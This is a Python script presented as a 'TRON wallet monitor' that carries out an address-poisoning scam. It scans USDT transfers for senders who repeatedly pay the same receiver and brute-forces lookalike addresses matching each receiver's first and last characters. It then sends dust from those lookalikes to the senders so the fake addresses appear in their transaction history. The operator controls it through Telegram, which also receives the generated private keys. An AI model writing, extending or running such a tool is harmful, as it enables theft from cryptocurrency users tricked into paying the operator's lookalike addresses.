import os
import time
import requests
import json
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from tronpy import Tron
from tronpy.keys import PrivateKey

# =========================
# SETTINGS
# =========================
TRONGRID_URL = "https://api.trongrid.io"
TRONSCAN_URL = "https://apilist.tronscanapi.com"
USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

MIN_BALANCE_USD = 0
MIN_TRANSFER_USD = 1
REQUIRED_TRANSFERS = 2
WINDOW_DAYS = 7
TARGET_PAIRS = 5

# 🟢 TEMPORARY BYPASS: Set to True to ignore CEX check and prove the bot works
SKIP_CEX_CHECK = True 

TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex', 'exchange']

found_pairs = []
transaction_logs = []
checked_wallets = set()
vanity_wallets = {}

print("✅ Script loaded successfully. Starting execution...")

# =========================
# TELEGRAM BOT
# =========================
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message, parse_mode="HTML"):
    if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
        return
    try:
        requests.post(
            f"{TELEGRAM_URL}/sendMessage",
            json={"chat_id": CHAT_ID, "text": message, "parse_mode": parse_mode},
            timeout=10
        )
    except Exception as e:
        print(f"Telegram error: {e}")

def get_telegram_updates(offset):
    if not TELEGRAM_BOT_TOKEN:
        return []
    try:
        r = requests.get(
            f"{TELEGRAM_URL}/getUpdates",
            params={"offset": offset, "timeout": 30},
            timeout=35
        )
        return r.json().get("result", [])
    except:
        return []

def check_if_cex(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {}
        r = requests.get(
            f"{TRONSCAN_URL}/api/account",
            params={"address": address},
            headers=headers,
            timeout=10
        )
        data = r.json()
        
        # DEBUG: Print raw API response to GitHub logs
        print(f" RAW API DATA for {address[:20]}...: {json.dumps(data)[:200]}")
        
        tags = " ".join(data.get("tags", [])).lower()
        name = (data.get("accountName") or data.get("name") or "").lower()
        combined = tags + " " + name
        
        for keyword in CEX_KEYWORDS:
            if keyword in combined:
                return True, keyword.capitalize()
        return False, None
    except Exception as e:
        print(f"CEX check error: {e}")
        return False, None

# =========================
# HTTP HELPERS
# =========================
def trongrid_get(path, params=None):
    headers = {}
    if TRONGRID_API_KEY:
        headers["TRON-PRO-API-KEY"] = TRONGRID_API_KEY
    url = TRONGRID_URL + path
    response = requests.get(url, params=params or {}, headers=headers, timeout=30)
    response.raise_for_status()
    return response.json()

def tronscan_get(path, params=None):
    headers = {}
    if TRONSCAN_API_KEY:
        headers["TRON-PRO-API-KEY"] = TRONSCAN_API_KEY
    url = TRONSCAN_URL + path
    response = requests.get(url, params=params or {}, headers=headers, timeout=30)
    response.raise_for_status()
    return response.json()

# =========================
# TRON ACCOUNT DATA
# =========================
def get_usdt_balance(address):
    try:
        data = trongrid_get(
            f"/v1/accounts/{address}/trc20/balance",
            {"only_confirmed": "true", "contract_address": USDT_CONTRACT}
        )
        if isinstance(data, dict):
            if "data" in data and isinstance(data["data"], list) and data["data"]:
                item = data["data"][0]
                if isinstance(item, dict):
                    value = item.get("balance", item.get("amount", 0))
                    try:
                        return int(value) / 1_000_000
                    except: pass
    except: pass
    return 0

def get_usdt_transfers(address, start_ms, end_ms):
    transfers = []
    fingerprint = None
    try:
        while True:
            params = {
                "only_confirmed": "true",
                "only_to": "true",
                "limit": 50, # Reduced for speed
                "order_by": "block_timestamp,desc",
                "min_timestamp": start_ms,
                "max_timestamp": end_ms,
                "contract_address": USDT_CONTRACT
            }
            if fingerprint:
                params["fingerprint"] = fingerprint
            data = trongrid_get(f"/v1/accounts/{address}/transactions/trc20", params)
            rows = data.get("data", [])
            for row in rows:
                try:
                    amount = int(row.get("value", 0)) / 1_000_000
                    transfers.append({
                        "txid": row.get("transaction_id"),
                        "from": row.get("from"),
                        "amount_usd": amount,
                        "timestamp": row.get("block_timestamp", 0)
                    })
                except: continue
            meta = data.get("meta", {})
            fingerprint = meta.get("fingerprint")
            if not fingerprint or not rows:
                break
    except Exception as e:
        print(f"Transfer fetch error for {address}: {e}")
    return transfers

# =========================
# QUALIFICATION CHECK
# =========================
def check_wallet(address):
    if address in checked_wallets:
        return False
    
    print(f"\n🔍 Checking receiver: {address}")
    
    usdt_balance = get_usdt_balance(address)
    print(f"  💰 USDT Balance: ${usdt_balance:.2f}")
    
    if usdt_balance < MIN_BALANCE_USD:
        return False

    now = datetime.now(timezone.utc)
    start_ms = int((now - timedelta(days=WINDOW_DAYS)).timestamp() * 1000)
    end_ms = int(now.timestamp() * 1000)

    transfers = get_usdt_transfers(address, start_ms, end_ms)
    print(f"  📄 Found {len(transfers)} USDT transfers")

    by_sender = defaultdict(list)
    for transfer in transfers:
        if transfer["amount_usd"] >= MIN_TRANSFER_USD:
            sender = transfer["from"]
            if sender:
                by_sender[sender].append(transfer)

    for sender, sender_transfers in by_sender.items():
        if len(sender_transfers) >= REQUIRED_TRANSFERS:
            print(f"  🎯 Pattern found! {sender[:20]}... sent {len(sender_transfers)} times")
            
            is_cex = False
            cex_name = "Unknown (Bypassed)"
            
            if not SKIP_CEX_CHECK:
                print(f"  🔍 Checking if sender is CEX...")
                is_cex, cex_name = check_if_cex(sender)
                print(f"   CEX Result: {is_cex} ({cex_name})")
                
                is_receiver_cex, _ = check_if_cex(address)
                if is_receiver_cex:
                    print(f"  ❌ Receiver is also CEX, skipping")
                    continue
            else:
                print(f"  ️ CEX CHECK SKIPPED (SKIP_CEX_CHECK = True)")

            if is_cex or SKIP_CEX_CHECK:
                print(f"  ✅ QUALIFIED! Adding to found pairs")
                checked_wallets.add(address)
                found_pairs.append({
                    "wallet_a": sender,
                    "wallet_b": address,
                    "cex_name": cex_name,
                    "txids": [t["txid"] for t in sender_transfers[:2]]
                })
                
                msg = (f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n"
                       f"🏦 Sender ({cex_name}): <code>{sender[:20]}...</code>\n"
                       f"👤 Receiver: <code>{address[:20]}...</code>")
                send_telegram(msg)
                return True
    
    checked_wallets.add(address)
    return False

# =========================
# NETWORK DISCOVERY
# =========================
def discover_recent_transfers(limit=50):
    try:
        data = tronscan_get(
            "/api/transfer",
            params={"start": 0, "limit": limit, "sort": "-timestamp"}
        )
        return data.get("data", [])
    except Exception as e:
        print(f"Discovery error: {e}")
        return []

# =========================
# VANITY WALLET & TRANSFERS
# =========================
def generate_vanity_wallet(target_address, max_attempts=10000):
    print(f"\n🔨 Generating vanity wallet for: {target_address[:20]}...")
    
    best_addr = None
    best_key = None
    best_score = 0
    best_prefix = 0
    best_suffix = 0
    
    for attempt in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()
        
        prefix_match = sum(1 for i in range(4) if i < len(addr) and i < len(target_address) and addr[i] == target_address[i])
        suffix_match = sum(1 for i in range(1, 5) if i <= len(addr) and i <= len(target_address) and addr[-i] == target_address[-i])
        total_score = prefix_match + suffix_match
        
        if total_score > best_score:
            best_score = total_score
            best_prefix = prefix_match
            best_suffix = suffix_match
            best_addr = addr
            best_key = key.hex()
            if best_score >= 6: break
    
    print(f"✅ Generated. Match: {best_prefix}/4 + {best_suffix}/4 = {best_score}/8")
    
    wallet_id = f"vanity_{len(vanity_wallets)+1}"
    vanity_wallets[wallet_id] = {
        "address": best_addr, "private_key": best_key, "target": target_address,
        "prefix_match": best_prefix, "suffix_match": best_suffix, "total_score": best_score,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    return best_addr, best_key, best_prefix, best_suffix

# =========================
# INTERACTIVE MODE
# =========================
def interactive_mode():
    send_telegram(
        f" <b>Target Reached! Found {len(found_pairs)} pairs</b>\n\n"
        f"<b>Commands:</b>\n"
        f"• <b>info</b> - Show pairs\n"
        f"• <b>vanity</b> - List vanity wallets\n"
        f"• <b>generate [pair#]</b> - Generate vanity for pair\n"
        f"• <b>transfer</b> - Execute transfers"
    )
    
    last_update_id = 0
    execute_triggered = False
    
    while not execute_triggered:
        updates = get_telegram_updates(last_update_id)
        for update in updates:
            last_update_id = update["update_id"]
            if update.get("message") and str(update["message"]["chat"]["id"]) == str(CHAT_ID):
                text = update["message"].get("text", "").strip()
                
                if text.lower() == "info":
                    msg = f"📋 <b>Found Pairs ({len(found_pairs)})</b>\n\n"
                    for i, p in enumerate(found_pairs):
                        msg += f"<b>#{i+1}</b> {p['cex_name']} → <code>{p['wallet_b'][:20]}...</code>\n"
                    send_telegram(msg)
                
                elif text.lower() == "vanity":
                    if not vanity_wallets:
                        send_telegram("📭 No vanity wallets yet. Use 'generate 1'")
                    else:
                        msg = f"📋 <b>Vanity Wallets</b>\n\n"
                        for wid, data in vanity_wallets.items():
                            msg += f"<b>{wid}</b>: <code>{data['address']}</code> (Score: {data['total_score']})\n"
                        send_telegram(msg)
                
                elif text.lower().startswith("generate"):
                    parts = text.split()
                    if len(parts) > 1:
                        try:
                            pair_num = int(parts[1]) - 1
                            if 0 <= pair_num < len(found_pairs):
                                pair = found_pairs[pair_num]
                                send_telegram(f"🔨 Generating for Pair #{pair_num+1}...")
                                addr, key, prefix, suffix = generate_vanity_wallet(pair['wallet_b'])
                                msg = (f"✅ <b>Vanity Generated</b>\n"
                                       f"🎭 <code>{addr}</code>\n"
                                       f"🔑 <code>{key}</code>\n"
                                       f"📊 Match: {prefix}+{suffix}")
                                send_telegram(msg)
                        except: send_telegram("❌ Invalid pair number")
                
                elif text.lower() == "transfer":
                    if not found_pairs:
                        send_telegram("❌ No pairs")
                    else:
                        send_telegram(f"🚀 <b>Executing {len(found_pairs)} transfers...</b>")
                        execute_triggered = True
                        break
        time.sleep(5)
    return execute_triggered

# =========================
# MAIN
# =========================
def main():
    global found_pairs
    
    print("\n" + "="*60)
    print("       TRON WALLET MONITOR (DEBUG + BYPASS MODE)")
    print("="*60 + "\n")
    
    send_telegram("🚀 <b>Monitor Started (Bypass Mode)</b>\nFinding patterns...")
    
    while len(found_pairs) < TARGET_PAIRS:
        print(f"\n Scanning... Found {len(found_pairs)}/{TARGET_PAIRS}")
        
        transfers = discover_recent_transfers(limit=50)
        print(f" Discovered {len(transfers)} recent transfers")
        
        if not transfers:
            time.sleep(5)
            continue
        
        candidates = set()
        for tx in transfers:
            to_addr = tx.get("to") or tx.get("toAddress") or tx.get("to_address")
            if to_addr: candidates.add(to_addr)
        
        print(f"🎯 Found {len(candidates)} candidate receivers")
        
        for address in list(candidates)[:10]:
            if len(found_pairs) >= TARGET_PAIRS: break
            try:
                check_wallet(address)
            except Exception as e:
                print(f"❌ Error: {e}")
            time.sleep(1)
        
        if len(found_pairs) < TARGET_PAIRS:
            time.sleep(3)
    
    execute = interactive_mode()
    
    if execute:
        print("\n Executing transfers...")
        for i, pair in enumerate(found_pairs):
            print(f"\nProcessing pair {i+1}/{len(found_pairs)}")
            vanity_addr, vanity_priv, prefix, suffix = generate_vanity_wallet(pair['wallet_b'])
            
            try:
                tron = Tron()
                priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                sender = priv.public_key.to_base58check_address()
                tx1 = tron.trx.transfer(sender, vanity_addr, 1).build().sign(priv).broadcast().txid
                print(f"✅ TX1: {tx1}")
                time.sleep(3)
                
                priv2 = PrivateKey(bytes.fromhex(vanity_priv))
                sender2 = priv2.public_key.to_base58check_address()
                tx2 = tron.trx.transfer(sender2, pair["wallet_a"], 1).build().sign(priv2).broadcast().txid
                print(f"✅ TX2: {tx2}")
                
                transaction_logs.append({"vanity": vanity_addr, "tx1": tx1, "tx2": tx2})
                send_telegram(f"✅ <b>Transfer {i+1} Done</b>\nTX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
            except Exception as e:
                print(f"❌ Transfer error: {e}")
                send_telegram(f"❌ Error: {e}")
            time.sleep(5)
        
        send_telegram("✅ <b>All transfers completed!</b>")
    
    print("\n✅ Workflow finished")

if __name__ == "__main__":
    main()
